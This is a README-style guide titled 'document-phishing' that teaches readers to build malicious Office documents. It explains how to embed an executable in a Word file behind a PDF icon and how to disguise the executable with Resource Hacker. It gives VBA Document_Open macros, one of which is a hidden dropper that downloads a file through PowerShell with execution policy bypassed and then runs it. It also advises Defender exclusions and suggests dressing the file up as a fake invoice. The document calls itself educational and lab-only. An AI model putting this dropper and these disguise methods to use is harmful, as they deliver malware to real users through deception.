# document-phishing
 Harmless Document-Embedded Executable – Educational Guide

> ⚠️ **Disclaimer**: This guide is for **educational and ethical purposes only**. Do not use any of the techniques described here outside of a controlled lab environment or without proper authorization.

---

# Simulating Document-Embedded Executables for Educational Purposes

This project demonstrates how attackers may simulate download or execution behavior using embedded files and macros. The purpose is to educate on social engineering tactics, red team testing, and awareness of malicious document mechanics. Everything in this guide is designed to be used in **controlled lab environments** only.

## Step 1: Create a Safe Executable (Python Example)

We'll start by creating a harmless Python app that simply displays a message box.

### harmless.py

    import tkinter as tk

    root = tk.Tk()
    root.title("Legit App")
    tk.Label(root, text="This is a safe test executable").pack()
    root.mainloop()

### Compile to `.exe` Using PyInstaller

    python -m PyInstaller --onefile harmless.py

## Step 2: Embed EXE into a Word Document (Macro-Free Method)

This step embeds your executable without using macros.

### Instructions

1. Open Microsoft Word → Go to Insert → Object  
2. Select Create from File → Browse to `dist/harmless.exe`  
3. Check "Display as icon" → Click "Change Icon"  
4. Replace the icon with a PDF or other legitimate-looking file type  

### Optional: Change EXE Icon Using Resource Hacker

To make your `.exe` appear more like a document:

1. Download and open Resource Hacker  
2. Extract a `.ico` file from a trusted app (e.g., Microsoft Edge's PDF icon)  
3. Open `harmless.exe` in Resource Hacker  
4. Go to Action → Add a New Resource  
5. Add your `.ico` file → Save the modified EXE  

## Defender and Sandbox Notes

Windows Defender will block unknown `.exe` files by default. Always test in:

- Windows Sandbox  
- A virtual machine  
- Or with Defender exclusions (only in isolated lab environments)  

## Step 3: Use Macros for Simulated Execution (With VBA)

Macros can automate document actions and simulate behaviors like:

- Message pop-ups  
- Downloading or launching safe files  

### What Are Macros?

Macros are embedded scripts written in VBA (Visual Basic for Applications) inside Office files. They're often abused in phishing attacks to execute code when a user clicks “Enable Content.”

### Harmless Macro Example (Message Box)

1. Open Microsoft Word  
2. Press Alt + F11 to open the VBA Editor  
3. In the left panel, double-click `ThisDocument`  
4. Paste the following code:

        Private Sub Document_Open()
            MsgBox "Document loaded successfully. Thank you!", vbInformation, "Notice"
        End Sub

5. Save as a Word Macro-Enabled Document (.docm)

## Making the Document Appear Legitimate

To increase realism:

- Use a convincing filename like `Invoice_1050_March2025.docm`  
- Add logos and headers  
- Include tables or line items that resemble business invoices  

## Run a Local Executable (Safe Testing)

        Private Sub Document_Open()
            Shell "C:\Users\YourUser\Desktop\SafeTestApp.exe", vbNormalFocus
        End Sub

## VBA Macro Template: Simulated Dropper (Download + Execute)

        Private Sub Document_Open()
            Dim fileURL As String
            Dim filePath As String
            Dim downloadCommand As String
            Dim executeCommand As String

            ' 1. URL of your test executable
            fileURL = "https://example.com/yourfile.exe"  ' <-- Replace with a safe URL

            ' 2. Path to save the file
            filePath = Environ("TEMP") & "\testfile.exe"

            ' 3. Command to download the file using PowerShell
            downloadCommand = "powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -Command " & _
                              """Invoke-WebRequest -Uri '" & fileURL & "' -OutFile '" & filePath & "'"""

            ' 4. Trigger download
            Shell downloadCommand, vbHide

            ' 5. Optional: Wait before execution
            Application.Wait Now + TimeValue("00:00:03")

            ' 6. Execute downloaded file
            Shell filePath, vbHide
        End Sub

Tip: Host a safe `.exe` on GitHub or a local server for testing.

## Conclusion

Learning how embedded executables and macros function is essential for ethical hackers and defenders alike. These simulations allow you to understand, detect, and prevent the tactics used in malicious document-based attacks.

**Only use these techniques in isolated test environments with explicit permission.**

## Recommended Learning Path

TryHackMe - MalDoc Room: https://tryhackme.com/room/maldoc  
Hands-on challenges to safely explore macro-based document exploitation.





 
